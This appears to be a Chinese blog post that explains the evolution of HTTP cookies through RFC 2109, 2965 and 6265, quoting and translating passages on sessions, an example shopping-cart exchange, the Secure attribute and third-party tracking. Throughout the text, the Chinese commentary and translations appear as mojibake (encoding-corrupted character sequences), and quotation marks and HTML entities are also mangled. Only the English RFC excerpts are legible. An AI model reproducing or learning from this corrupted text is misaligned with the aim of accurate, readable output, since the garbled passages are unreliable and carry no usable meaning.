å†ä¾†ç¬¬äºŒå€‹éƒ¨åˆ† TERMINOLOGY å°±æ˜¯è¦å®šä¸€äº›å°ˆæœ‰åè©çš„ç”¨æ³•ï¼Œå¯ä»¥ç¨å¾®æƒéå»å°±å¥½ï¼Œé‡é»åœ¨ç¬¬ä¸‰å€‹éƒ¨åˆ† STATE AND SESSIONSï¼š

This document describes a way to create stateful sessions with HTTP requests and responses.  Currently, HTTP servers respond to each client request without relating that request to previous or subsequent requests; the technique allows clients and servers that wish to exchange state information to place HTTP requests and responses within a larger context, which we term a â€œsessionâ€.  
é€™ä»½æ–‡ä»¶è¦å®šäº†ä¸€ç¨®åˆ©ç”¨ HTTP request èˆ‡ response å»ºç«‹æœ‰ç‹€æ…‹çš„ session çš„æ–¹æ³•ã€‚ç›®å‰ HTTP ä¼ºæœå™¨ç¨ç«‹å›æ‡‰æ¯ä¸€å€‹ Requestï¼Œä¸æŠŠå®ƒèˆ‡å…¶ä»– Request é—œè¯ï¼Œè€Œé€™å€‹æ–¹æ³•å…è¨±æƒ³è¦äº¤æ›ç‹€æ…‹è³‡è¨Šçš„ Server èˆ‡ Client æŠŠ HTTP Request èˆ‡ Response æ”¾åœ¨ä¸€å€‹æ›´å¤§çš„ context åº•ä¸‹ï¼Œæˆ‘å€‘ç¨±ä¹‹ç‚ºä¸€å€‹ sessionã€‚ï¼ˆé€™æ®µæˆ‘è¦ºå¾—è¶…ç´šé›£ç¿»â€¦è€Œä¸”ä¸€å®šç¿»å¾—ä¸å¥½ï¼‰


This context might be used to create, for example, a â€œshopping cartâ€, in which user selections can be aggregated before purchase, or a magazine browsing system, in which a userâ€™s previous reading affects which offerings are presented.
èˆ‰ä¾‹ä¾†èªªï¼Œé€™å€‹ context å¯ä»¥ç”¨ä¾†å»ºç«‹è³¼ç‰©è»Šçš„åŠŸèƒ½ï¼Œåœ¨è³¼è²·å‰å¯ä»¥çŸ¥é“ä½¿ç”¨è€…é¸äº†å“ªäº›ç‰©å“ï¼Œæˆ–è€…æ˜¯é›œèªŒç€è¦½ç³»çµ±ï¼Œå¾ä»¥å‰è®€éçš„æ±è¥¿æ¨è–¦å¯èƒ½å–œæ­¡çš„å…§å®¹ã€‚

é€™é‚Šå°æ–¼ Session çš„å®šç¾©å°±å¦‚åŒæˆ‘å‰é¢æ‰€è¬›çš„é‚£æ¨£ï¼ŒSession æ˜¯ã€Œå…·æœ‰ç‹€æ…‹çš„ä¸€æ®µæœŸé–“ã€ï¼Œæˆ–è€…æ˜¯ã€Œä¸Šä¸‹æ–‡ã€ï¼Œå°±æ˜¯ä¸Šé¢æ‰€æåˆ°çš„ contextï¼Œåœ¨é€™å€‹ context è£¡é¢çš„ Request èˆ‡ Response å¯ä»¥æ”¾åœ¨ä¸€èµ·çœ‹ï¼Œæ–¼æ˜¯ä»–å€‘ä¹‹é–“å°±æœ‰äº†ç‹€æ…‹ã€‚

There are, of course, many different potential contexts and thus many different potential types of session.  The designersâ€™ paradigm for sessions created by the exchange of cookies has these key attributes:

Each session has a beginning and an end.
Each session is relatively short-lived.
Either the user agent or the origin server may terminate a session.
The session is implicit in the exchange of state information.

æœ‰å¾ˆå¤šç¨®ä¸åŒå‹æ…‹çš„ sessionï¼Œè€Œè—‰ç”±äº¤æ› cookie æ‰€å»ºç«‹çš„ session æœ‰å¹¾å€‹é‡é»ï¼š

æ¯å€‹ session éƒ½æœ‰é–‹å§‹èˆ‡çµæŸ
æ¯å€‹ session éƒ½æ˜¯ç›¸å°çŸ­æš«çš„
ç€è¦½å™¨æˆ–ä¼ºæœå™¨ä»»ä½•ä¸€æ–¹éƒ½å¯ä»¥çµ‚æ­¢é€™å€‹ session
Session è˜Šå«äº†äº¤æ›ç‹€æ…‹è³‡è¨Šçš„æ¦‚å¿µåœ¨è£¡é¢


é€™é‚Šå°±æ˜¯ç¨å¾®ä»‹ç´¹äº†ä¸€ä¸‹ Session çš„ç‰¹æ€§è€Œå·²ã€‚è‹¥æ˜¯æˆ‘å€‘æŠŠ Session ç†è§£ç‚ºæ˜¯ä¸€ç¨®ã€Œæ©Ÿåˆ¶ã€ï¼Œé‚£è©²å¦‚ä½•è§£é‡‹ä¸Šé¢çš„æ®µè½ï¼Ÿã€Œæ¯å€‹ Session æ©Ÿåˆ¶éƒ½æ˜¯ç›¸å°çŸ­æš«çš„ã€ï¼Ÿï¼Œè½èµ·ä¾†æœ‰é»æ€ªæ€ªçš„ï¼Œæ‰€ä»¥é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘æœƒèªª Session ç•¶ä½œæ©Ÿåˆ¶ä¾†è§£æœ‰ä¸€é»å¥‡æ€ªã€‚
æ¥ä¸‹ä¾†ç¬¬å››å€‹ç« ç¯€å¾ˆå¤šéƒ¨åˆ†éƒ½æ˜¯åœ¨è¬›é‚£äº› Header çš„è¦æ ¼ï¼Œé€™é‚Šæˆ‘å€‘è·³éä¸çœ‹ï¼Œåªç¯€é¸å¹¾å€‹æˆ‘èªç‚ºæ¯”è¼ƒé‡è¦çš„æ®µè½å‡ºä¾†ï¼š

4.2.1  General
The origin server initiates a session, if it so desires. (â€¦) &gt;To initiate a session, the origin server returns an extra response header to the client, Set-Cookie.  (The details follow later.)
A user agent returns a Cookie request header (see below) to the origin server if it chooses to continue a session.


å¦‚æœ Server éœ€è¦çš„è©±ï¼Œå®ƒå¯ä»¥åˆå§‹åŒ–ä¸€å€‹ sessionï¼Œè€Œåˆå§‹åŒ–çš„æ–¹æ³•æ˜¯å›å‚³ä¸€å€‹ Set-Cookie çš„ Headerï¼Œè‹¥æ˜¯ç€è¦½å™¨æ±ºå®šç¹¼çºŒé€™å€‹ session çš„è©±ï¼Œå¯ä»¥å›å‚³ Cookie é€™å€‹ Header

ç°¡å–®ä¾†èªªå°±æ˜¯ä½ æŠŠä¼ºæœå™¨æŠŠç‹€æ…‹æ”¾åœ¨ Set-Cookie é€™å€‹ Header è£¡é¢é€å»ç€è¦½å™¨ï¼Œè€Œç€è¦½å™¨åœ¨ä¹‹å¾Œçš„ Request æŠŠ Cookie å¸¶ä¸Šå»ï¼Œé€™æ¨£å­å°±æˆç«‹ä¸€å€‹ Session äº†ï¼Œå› ç‚ºå¾ŒçºŒçš„ Request å°±æœ‰äº†ç‹€æ…‹ã€‚
å†ä¾†å¯ä»¥çœ‹ä¸€ä¸‹ç¬¬äº”å€‹ç« ç¯€ EXAMPLES çš„éƒ¨åˆ†ï¼Œæˆ‘å€‘ä¾†çœ‹å…¶ä¸­ä¸€å€‹ä¾‹å­ï¼Œé€™é‚Šçš„ä¾‹å­æ¯”è¼ƒç°¡å–®ï¼Œæˆ‘å°±ç›´æ¥ç¿»ä¸­æ–‡äº†ï¼Œæƒ³çœ‹åŸæ–‡å¯ä»¥åˆ°é€™è£¡ï¼š5.1 Example 1ã€‚
ç¬¬ä¸€æ­¥ï¼šç€è¦½å™¨ -&gt; ä¼ºæœå™¨POST /acme/login HTTP/1.1[form data]

ä½¿ç”¨è€…é€éè¡¨å–®ç™»å…¥ã€‚
ç¬¬äºŒæ­¥ï¼šä¼ºæœå™¨ -&gt; ç€è¦½å™¨HTTP/1.1 200 OKSet-Cookie: Customer=&quot;WILE_E_COYOTE&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;

ç™»å…¥æˆåŠŸï¼Œä¼ºæœå™¨ç™¼é€ Set-Cookie Header ä¸¦è¨­ç½®è³‡è¨Šï¼Œå„²å­˜äº†ä½¿ç”¨è€…çš„èº«ä»½ã€‚
ç¬¬ä¸‰æ­¥ï¼šç€è¦½å™¨ -&gt; ä¼ºæœå™¨POST /acme/pickitem HTTP/1.1Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;[form data]

ä½¿ç”¨è€…æŠŠæŸå€‹ç‰©å“åŠ å…¥è³¼ç‰©è»Šã€‚
ç¬¬å››æ­¥ï¼šä¼ºæœå™¨ -&gt; ç€è¦½å™¨HTTP/1.1 200 OKSet-Cookie: Part_Number=&quot;Rocket_Launcher_0001&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;

ä¼ºæœå™¨å†è¨­ç½®ä¸€å€‹ Cookie ä¾†å„²å­˜å‰›å‰›åŠ å…¥è³¼ç‰©è»Šçš„æ±è¥¿ã€‚
ç¬¬äº”æ­¥ï¼šç€è¦½å™¨ -&gt; ä¼ºæœå™¨POST /acme/shipping HTTP/1.1Cookie: $Version=&quot;1&quot;;  Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;;  Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot;  [form data]

ä½¿ç”¨è€…åˆ©ç”¨è¡¨å–®é¸æ“‡å•†å“çš„é‹é€æ–¹å¼ã€‚
ç¬¬å…­æ­¥ï¼šä¼ºæœå™¨ -&gt; ç€è¦½å™¨HTTP/1.1 200 OKSet-Cookie: Shipping=&quot;FedEx&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;

è¨­ç½®æ–°çš„ Cookie ä¾†å„²å­˜é‹é€æ–¹å¼ã€‚
ç¬¬ä¸ƒæ­¥ï¼šç€è¦½å™¨ -&gt; ä¼ºæœå™¨POST /acme/process HTTP/1.1Cookie: $Version=&quot;1&quot;;  Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;;  Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot; Shipping=&quot;FedEx&quot;; $Path=&quot;/acme&quot; [form data]

ä½¿ç”¨è€…é¸æ“‡çµå¸³ã€‚
ç¬¬å…«æ­¥ï¼šä¼ºæœå™¨ -&gt; ç€è¦½å™¨HTTP/1.1 200 OK

æ ¹æ“šç€è¦½å™¨å¸¶ä¸Šä¾†çš„ Cookie å¾—çŸ¥ç”¨æˆ¶è³‡æ–™ã€è³¼è²·å“é …ä»¥åŠé‹é€æ–¹å¼ï¼Œäº¤æ˜“å®Œæˆï¼
ä¸Šé¢é€™å€‹ç¯„ä¾‹å¤§è‡´èªªæ˜äº† Cookie çš„é‹ä½œæ–¹å¼ï¼Œå°±æ˜¯é€éä¼ºæœå™¨å‚³é€ Set-Cookie é€™å€‹ header ä¾†è¨­ç½®è³‡è¨Šï¼Œä¸¦ä¸”é ç€è¦½å™¨å‚³é€ Cookie header æŠŠä¹‹å‰å„²å­˜çš„è³‡è¨Šä¸€ä½µå¸¶ä¸Šä¾†ï¼Œé€™æ¨£å­å°±æœ‰äº†ç‹€æ…‹ï¼Œå°±é–‹å•Ÿäº†ä¸€æ®µ Sessionã€‚
æ¥è‘—ä¾†çœ‹ç¬¬å…­éƒ¨åˆ†ï¼šIMPLEMENTATION CONSIDERATIONSï¼Œè¬›åˆ°å¯¦ä½œä¸Šçš„ä¸€äº›è€ƒé‡ï¼Œé€™é‚Šä¸€æ¨£æˆªå–ç‰‡æ®µï¼š

6.1  Set-Cookie Content
The session information can obviously be clear or encoded text that describes state.  However, if it grows too large, it can become unwieldy.  Therefore, an implementor might choose for the session information to be a key to a server-side resource.  Of course, using a database creates some problems that this state management specification was meant to avoid, namely:

keeping real state on the server side;
how and when to garbage-collect the database entry, in case the user agent terminates the session by, for example, exiting.

å­˜åœ¨ cookie è£¡çš„ session è³‡è¨Šå¯ä»¥æ˜¯æ˜æ–‡æˆ–æ˜¯ç·¨ç¢¼éå¾Œçš„æ–‡å­—ï¼Œä½†å¦‚æœå­˜çš„æ±è¥¿å¤ªå¤šæœƒè®Šå¾—å¤ªç¬¨é‡ã€‚æ‰€ä»¥ï¼Œä½ å¯ä»¥é¸æ“‡åªåœ¨ session è³‡è¨Šè£¡æ”¾ä¸€å€‹å°æ‡‰åˆ°ä¼ºæœå™¨è³‡æºçš„ keyã€‚ä½†é€™ç¨®æ–¹å¼æœƒé€ æˆä¸€äº›é€™å€‹ç‹€æ…‹ç®¡ç†æ©Ÿåˆ¶æœ¬ä¾†å°±æƒ³é¿å…æ‰çš„ä¸€äº›å•é¡Œï¼Œä¸»è¦æ˜¯ï¼š

æŠŠç‹€æ…‹æ”¾åœ¨ server
å¦‚ä½•ä»¥åŠä½•æ™‚æŠŠæ²’æœ‰ç”¨çš„ç‹€æ…‹è³‡è¨Šæ¸…æ‰


å…¶å¯¦é€™ç¨®æ–¹å¼å°±æ˜¯æˆ‘å€‘åœ¨ä¸Šä¸€ç¯‡æ‰€æåˆ°çš„å…©å€‹ä¸åŒçš„æ–¹æ³•ï¼šCookie-based session ä»¥åŠ SessionIDï¼Œå‰è€…çš„ç¼ºé»å°±æ˜¯å­˜å¤ªå¤šæ±è¥¿æœƒè®Šå¾—ç¬¨é‡ï¼Œå¾Œè€…å‰‡æ˜¯éœ€è¦æŠŠç‹€æ…‹æ”¾åœ¨ Serverã€‚
å…©ç¨®æ–¹å¼å…¶å¯¦å„æœ‰å„ªåŠ£ï¼Œä½†æ¯”è¼ƒå¸¸ä½¿ç”¨çš„é‚„æ˜¯ SessionID é‚£ç¨®æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯åŸæ–‡æåˆ°çš„ï¼šã€Œsession information to be a key to a server-side resourceã€ã€‚
å¥½ï¼Œå…¶ä»–éƒ½æ˜¯æœ‰é—œå®‰å…¨æ€§æˆ–æ˜¯è·Ÿéš±ç§æœ‰é—œçš„éƒ¨åˆ†ï¼Œè·Ÿæˆ‘å€‘é€™ç¯‡è¦è«‡çš„è­°é¡Œæœ‰é»å·®ç•°ï¼Œå› æ­¤æˆ‘å°±ä¸ç‰¹åˆ¥æäº†ã€‚
è®“æˆ‘å€‘å…ˆä¾†æ•´ç†ä¸€ä¸‹ä¸Šé¢æ‰€çœ‹åˆ°çš„æ±è¥¿ã€‚
é¦–å…ˆï¼ŒCookie å°±æ˜¯ç‚ºäº†è¦å»ºç«‹ Session è€Œç”Ÿçš„ï¼Œå› ç‚ºåœ¨é€™ä¹‹å‰è¦å»ºç«‹ Session åªèƒ½é€éæˆ‘ä¸Šä¸€ç¯‡æåˆ°çš„é‚£äº›æ–¹å¼ï¼Œä¾‹å¦‚èªªç”¨ç¶²å€åˆ—å¸¶è³‡è¨Šï¼Œæˆ–è€…æ˜¯åœ¨ form è£¡é¢æ”¾ä¸€å€‹ hidden çš„æ¬„ä½ã€‚ç‚ºäº†ç°¡åŒ–é€™äº›è¡Œç‚ºæ‰æœ‰äº† Cookieã€‚
è€Œå¯¦éš›æ–¹å¼å°±æ˜¯ Server å›å‚³ Set-Cookie çš„ headerï¼ŒUser agent æŠŠé€™äº›è³‡è¨Šå„²å­˜èµ·ä¾†ä¹‹å¾Œï¼Œåœ¨å¾ŒçºŒçš„ Request éƒ½åŠ ä¸Šä¸€å€‹ Cookie headerï¼Œé€™å°±æ˜¯æˆ‘å€‘ä¸Šä¸€ç¯‡ä¸­æ‰€æåˆ°çš„ã€Œç´™æ¢ã€ï¼Œæ¯æ¬¡éƒ½æœƒå¸¶è‘—é€™å€‹ç´™æ¢ï¼Œå°±è®“ Request ä¹‹é–“æœ‰äº†ç‹€æ…‹ã€‚
è‡³æ–¼è¦åœ¨ Cookie è£¡æ”¾ä»€éº¼ç‹€æ…‹éƒ½è¡Œï¼Œä½†å¦‚æœæ”¾çš„æ±è¥¿å¤ªå¤šå¯ä»¥è€ƒæ…®æŠŠé€™äº›ç‹€æ…‹ç§»åˆ° Server å»ï¼Œåªåœ¨ Cookie è£¡æ”¾ä¸€å€‹å¯ä»¥å°æ‡‰çš„ IDã€‚é€™å°±æ˜¯æˆ‘å€‘ä¹‹å‰æ‰€èªªçš„ Session ID èˆ‡ Session Dataã€‚
RFC 2965RFC 2965 èª•ç”Ÿæ–¼ 2000 å¹´ï¼Œä¸éå®ƒçš„å…§å®¹è·Ÿ RFC 2109 å…¶å¯¦ç›¸å»ä¸é ï¼Œå¤§æ¦‚æœ‰å…«æˆçš„å…§å®¹éƒ½æ˜¯ä¸€æ¨£çš„ã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿ
åœ¨ RFC 2109 å‡ºä¾†ä¹‹å¾Œä¸ä¹…ä»–å€‘ç™¼ç¾äº† IE3 èˆ‡ Netscape Navigator3 å°æ–¼é€™ä»½ã€Œæ–°çš„ã€Cookie æ¨™æº–ï¼ˆèˆŠçš„æŒ‡çš„æ˜¯ Netscape åŸæœ¬è‡ªå·±çš„é‚£å¥—è¦ç¯„ï¼‰å¯¦ä½œä¸åŒï¼Œä¾‹å¦‚èªªåº•ä¸‹é€™ä¸€æ®µï¼š
Set-cookie: xx=&quot;1=2\&amp;3-4&quot;;Comment=&quot;blah&quot;;Version=1; Max-Age=15552000; Path=/;Expires=Sun, 27 Apr 1997 01:16:23 GMT

åœ¨ IE è£¡é¢æœƒæŠŠ Cookie è¨­ç½®æˆé€™æ¨£ï¼šCookie: Max-Age=15552000ï¼Œåœ¨ Netscape Navigator è£¡é¢å‰‡æ˜¯æˆ‘å€‘é æœŸçš„ï¼šCookie: xx=&quot;1=2\&amp;3-4&quot;.ï¼ŒåŒä¸€æ®µ Header å»ç”¢ç”Ÿäº†ä¸åŒçš„çµæœï¼Œæ–¼æ˜¯ä»–å€‘å°±è¦æƒ³è¾¦æ³•ä¾†ä¿®æ­£é€™å€‹è¡Œç‚ºã€‚
æœ€å¾Œå°±æœ‰äº† RFC 2965 çš„å‡ºç¾ï¼Œè§£æ±ºæ–¹å¼æ˜¯å¼•å…¥äº†å…©å€‹æ–°çš„ Headerï¼šCookie2 è·Ÿ Set-Cookie2ï¼Œå…¶é¤˜éƒ¨åˆ†éƒ½èˆ‡ RFC 2109 å·®ä¸å¤šã€‚
å› æ­¤ 2965 æˆ‘å€‘å¯ä»¥è·³éä¸çœ‹ï¼Œç›´æ¥ä¾†çœ‹æœ€æ–°çš„ RFC 6265ã€‚
RFC 6265RFC 6265 æ˜¯ 2011 å¹´å‡ºç¾çš„æ–‡ä»¶ï¼Œè·Ÿä¸Šä¸€ä»½ç›¸éš” 11 å¹´ã€‚
è€Œé€™ä»½æ–‡ä»¶å¯ä»¥èªªæ˜¯æŠŠ Cookie è¦å‰‡å†ç¿»æ–°äº†ä¸€éï¼Œä¿®æ”¹çš„å¹…åº¦å¾ˆå¤§ï¼Œåœ¨ Introduction è£¡é¢å°±æœ‰èªªæ˜äº†ï¼š

Prior to this document, there were at least three descriptions of cookies: the so-called â€œNetscape cookie specificationâ€ [Netscape], RFC 2109 [RFC2109], and RFC 2965 [RFC2965].  However, none of these documents describe how the Cookie and Set-Cookie headers are actually used on the Internet (see [Kri2001] for historical context).
åœ¨é€™ä»½æ–‡ä»¶ä¹‹å‰ï¼Œè‡³å°‘å­˜åœ¨è‘—ä¸‰ä»½ä¸åŒçš„ Cookie è¦æ ¼ï¼Œç¬¬ä¸€å€‹æ˜¯ Netscape çš„è¦æ ¼ï¼Œå†ä¾†æ˜¯ RFC 2109 ä»¥åŠ 2965ã€‚å¯æ˜¯æ²’æœ‰ä¸€ä»½æ–‡ä»¶çœŸçš„åœ¨æè¿°ç¾ä»Šæˆ‘å€‘å¦‚ä½•ä½¿ç”¨ Cookie èˆ‡ Set-Cookieã€‚

æœ‰äº›æˆ‘å€‘ç¾åœ¨åœ¨ç”¨çš„å±¬æ€§ï¼Œåœ¨ RFC 2965 éƒ½æ˜¯ä¸å­˜åœ¨çš„ï¼Œä¾‹å¦‚èªª HttpOnlyã€‚é€™ä»½è¦ç¯„æŠŠå¾ˆå¤šæ±è¥¿éƒ½å®šç¾©çš„æ¯”è¼ƒæ˜ç¢ºï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥è‡ªå·±å»çœ‹ã€‚
æ¥è‘—æˆ‘å€‘ä¾†çœ‹ä¸€äº›æœ‰è¶£çš„åœ°æ–¹å¥½äº†ï¼Œç¬¬ä¸€å€‹æ˜¯ 3.1 Examplesï¼Œè£¡é¢æåˆ°çš„ç¯„ä¾‹ç›´æ¥ä½¿ç”¨äº† SessionIDï¼š

3.1.  Examples
Using the Set-Cookie header, a server can send the user agent a short string in an HTTP response that the user agent will return in future HTTP requests that are within the scope of the cookie.  For example, the server can send the user agent a â€œsession identifierâ€ named SID with the value 31d4d96e407aad42.  The user agent then returns the session identifier in subsequent requests.
ä¼ºæœå™¨å¯ä»¥åˆ©ç”¨ Set-Cookie header è¨­ç½®ä¸€å€‹ç°¡çŸ­çš„å­—ä¸²ï¼Œè€Œç€è¦½å™¨æœƒåœ¨å¾ŒçºŒçš„ Request æŠŠé€™å€‹å­—ä¸²å‚³ä¸Šä¾†ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œä¼ºæœå™¨å¯ä»¥å‚³é€ä¸€å€‹ã€Œsession identifierã€ç¨±ä¹‹ç‚º SIDï¼Œå…§å®¹æ˜¯ 31d4d96e407aad42ï¼Œè€Œç€è¦½å™¨å°±æœƒåœ¨ä¹‹å¾Œçš„ Request æŠŠé€™å€‹ sessionID å‚³ä¸Šä¾†ã€‚

åº•ä¸‹é‚„æœ‰æä¾›æ›´å®Œæ•´çš„ç¯„ä¾‹ï¼Œä½†æœ‰é»é•·æˆ‘å°±ä¸ç¿»äº†ã€‚å…¶å¯¦æˆ‘å¾ˆæ¨è–¦å¤§å®¶è‡ªå·±æŠŠé€™æ•´ä»½æ–‡ä»¶éƒ½çœ‹å®Œï¼Œå› ç‚ºé€™æ•´ä»½æ–‡ä»¶å®šç¾©çš„å°±æ˜¯ç¾åœ¨æˆ‘å€‘åœ¨ä½¿ç”¨çš„ Cookie è¦æ ¼ï¼ˆåŸºæœ¬ä¸Šæ˜¯å•¦ï¼Œé›–ç„¶é‚„æ˜¯æœ‰ä¸€é»å‡ºå…¥ï¼‰ï¼Œä½ å¯ä»¥å¾è¦æ ¼è£¡é¢çŸ¥é“æœ€æ­£ç¢ºçš„è³‡è¨Šã€‚
ä¾‹å¦‚èªªï¼š

4.1.2.5.  The Secure Attribute
The Secure attribute limits the scope of the cookie to â€œsecureâ€ channels (where â€œsecureâ€ is defined by the user agent).  When a cookie has the Secure attribute, the user agent will include the cookie in an HTTP request only if the request is transmitted over a secure channel (typically HTTP over Transport Layer Security (TLS)[RFC2818]).
Secure é€™å€‹å±¬æ€§é™åˆ¶äº† Cookie åªèƒ½åœ¨ã€Œå®‰å…¨ã€çš„ç®¡é“ä¸Šå‚³è¼¸ï¼ˆå®‰å…¨çš„å®šç¾©ç”± user agent è‡ªå·±å®šç¾©ï¼‰ã€‚ç•¶ä¸€å€‹ Cookie æœ‰äº† Secure é€™å€‹å±¬æ€§ï¼Œåªæœ‰ç•¶ Request åœ¨å®‰å…¨çš„ç®¡é“ï¼ˆé€šå¸¸æŒ‡çš„æ˜¯ TLSï¼‰ä¸­å‚³è¼¸æ™‚æ‰æœƒæŠŠ cookie æ”¾é€² HTTP Request è£¡é¢ã€‚

é€™é‚Šæˆ‘å€‘å°±å¯ä»¥çœ‹åˆ°è¦æ ¼èˆ‡å¯¦ä½œçš„å·®ç•°ã€‚è¦æ ¼åªèªªäº†ã€Œä»€éº¼æ˜¯å®‰å…¨ç”± user agent è‡ªå·±å®šç¾©ã€ï¼Œè€Œæ²’æœ‰å¼·åˆ¶è¦ç¯„èªªã€Œä¸€å®šè¦åœ¨ HTTPS çš„æ™‚å€™æ‰èƒ½å‚³è¼¸ã€ã€‚æ‰€ä»¥ä¸€èˆ¬æˆ‘å€‘æ‰€èªçŸ¥çš„ã€ŒSecure å°±æ˜¯ä»£è¡¨ä¸€å®šè¦ HTTPS æ‰æœƒè¢«å‚³é€ã€å…¶å¯¦æŒ‡çš„æ˜¯ä¸»æµç€è¦½å™¨çš„å¯¦ä½œï¼Œè€Œä¸æ˜¯ RFC çš„è¦ç¯„ã€‚
æ‰€ä»¥å¦‚æœæƒ³å®Œæ•´å›ç­”ã€Œè¨­ç½® Secure å±¬æ€§ä»£è¡¨ä»€éº¼ã€é€™å€‹å•é¡Œï¼Œå¯ä»¥é€™æ¨£å›ç­”ï¼š

ä»£è¡¨é€™å€‹ Cookie åªèƒ½é€é secure çš„ç®¡é“è¢«å‚³è¼¸ï¼Œè‡³æ–¼ä»€éº¼æ˜¯ secureï¼ŒRFC ä¸Šå¯«èªªç”±ç€è¦½å™¨è‡ªè¡Œå®šç¾©ã€‚ä¾æ“šç›®å‰ä¸»æµçš„å¯¦ä½œï¼Œå°±æ˜¯æŒ‡åªèƒ½é€é HTTPS ä¾†å‚³é€

å†ä¾†æˆ‘å€‘ä¾†çœ‹è·Ÿæˆ‘å€‘åˆ‡èº«ç›¸é—œçš„ä¸€å€‹æ±è¥¿ï¼š

7.Privacy Considerations
Cookies are often criticized for letting servers track users.  For example, a number of â€œweb analyticsâ€ companies use cookies to recognize when a user returns to a web site or visits another web site.  Although cookies are not the only mechanism servers can use to track users across HTTP requests, cookies facilitate tracking because they are persistent across user agent sessions and can be shared between hosts.
Cookie å› ç‚ºå¯ä»¥è¢«ç”¨ä¾†è¿½è¹¤ä½¿ç”¨è€…è€Œé£½å—æ‰¹è©•ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œå¾ˆå¤šåœ¨åš web analytics çš„å…¬å¸ç”¨ cookie ä¾†è¾¨èªç”¨æˆ¶é€ è¨ªäº†å“ªäº›ç¶²ç«™ã€‚é›–ç„¶ cookie ä¸æ˜¯å”¯ä¸€èƒ½è¿½è¹¤ä½¿ç”¨è€…çš„æŠ€è¡“ï¼Œä½†å› ç‚ºå®ƒå¯ä»¥åœ¨ä¸åŒ host è¢«å…±äº«çš„ç‰¹æ€§ï¼Œçš„ç¢ºä¿ƒé€²äº†é€™ç¨®è¿½è¹¤çš„è¡Œç‚ºã€‚
7.1. Third-Party Cookies
Particularly worrisome are so-called â€œthird-partyâ€ cookies.  In rendering an HTML document, a user agent often requests resources from other servers (such as advertising networks).  These third-party servers can use cookies to track the user even if the user never visits the server directly.  For example, if a user visits a site that contains content from a third party and then later visits another site that contains content from the same third party, the third party can track the user between the two sites.
æœ€ä»¤äººæ“”å¿ƒçš„å°±æ˜¯ç¬¬ä¸‰æ–¹ cookieã€‚åœ¨æ¸²æŸ“ HTML é é¢æ™‚ï¼Œç€è¦½å™¨å¸¸æœƒç™¼é€ä¸€äº› Request å»å…¶ä»–çš„ Serverï¼ˆä¾‹å¦‚èªªå»£å‘Šå•†çš„ä¼ºæœå™¨ï¼‰ï¼Œæ‰€ä»¥å„˜ç®¡é€™äº›ä½¿ç”¨è€…å¾ä¾†æ²’æœ‰ç›´æ¥é€ è¨ªé€™äº›ç¶²ç«™ï¼Œé€™äº›ç¶²ç«™å¯ä»¥åˆ©ç”¨ Cookie ä¾†è¿½è¹¤ä½¿ç”¨è€…ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œä½¿ç”¨è€…é€ è¨ªäº†æœ‰è·ŸæŸå»£å‘Šå•†åˆä½œçš„ A ç¶²ç«™ï¼Œç„¶å¾Œåˆå»äº†è·ŸåŒå€‹å»£å‘Šå•†æœ‰åˆä½œçš„ B ç¶²ç«™ï¼Œå»£å‘Šå•†å°±å¯ä»¥åœ¨é€™å…©å€‹ç¶²ç«™ä¹‹é–“è¿½è¹¤ä½¿ç”¨è€…ã€‚
Some user agents restrict how third-party cookies behave.  For example, some of these user agents refuse to send the Cookie header in third-party requests.  Others refuse to process the Set-Cookie header in responses to third-party requests.  User agents vary widely in their third-party cookie policies.  This document grants user agents wide latitude to experiment with third-party cookie policies that balance the privacy and compatibility needs of their users. However, this document does not endorse any particular third-party cookie policy.
æœ‰äº›ç€è¦½å™¨æœƒé™åˆ¶ç¬¬ä¸‰æ–¹ Cookieã€‚èˆ‰ä¾‹ä¾†èªªï¼Œæœ‰äº›ä¸ç™¼é€ Cookie header çµ¦ç¬¬ä¸‰æ–¹ï¼Œæœ‰äº›å‰‡æ˜¯ä¸è™•ç†ç¬¬ä¸‰æ–¹çš„ Set-Cookie headerã€‚æ¯ä¸€å€‹ç€è¦½å™¨å°æ–¼ç¬¬ä¸‰æ–¹ cookie çš„è™•ç†æ–¹å¼éƒ½ä¸å¤ªä¸€æ¨£ï¼Œè€Œé€™ä»½æ–‡ä»¶çµ¦äº†ç€è¦½å™¨å¾ˆå¤§çš„ç©ºé–“å»å¯¦é©—ä»€éº¼æ˜¯å°ä½¿ç”¨è€…æœ€å¥½çš„ç­–ç•¥ï¼Œè©¦åœ–åœ¨éš±ç§èˆ‡å…¼å®¹æ€§ä¹‹é–“å–å¾—ä¸€å€‹å¹³è¡¡ã€‚ç„¶è€Œï¼Œé€™ä»½æ–‡ä»¶ä¸æœƒèªå¯ä»»ä½•ä¸€å€‹ç‰¹å®šçš„ç¬¬ä¸‰æ–¹ cookie è™•ç†æ–¹å¼ã€‚
Third-party cookie blocking policies are often ineffective at achieving their privacy goals if servers attempt to work around their restrictions to track users.  In particular, two collaborating servers can often track users without using cookies at all by injecting identifying information into dynamic URLs.
å¦‚æœ Server ç”¨ä¸€äº› workaround è¿½è¹¤ä½¿ç”¨è€…çš„è©±ï¼Œé˜»æ“‹ç¬¬ä¸‰æ–¹ cookie çš„ç­–ç•¥å…¶å¯¦ä¸æ˜¯é‚£éº¼æœ‰ç”¨ã€‚ä¾‹å¦‚èªªä»–å€‘å¯ä»¥æŠŠè³‡è¨Šé™„åŠ åœ¨ URL ä¸Šé¢ä¾†è¿½è¹¤ç”¨æˆ¶ï¼Œè€Œä¸é€é Cookieã€‚

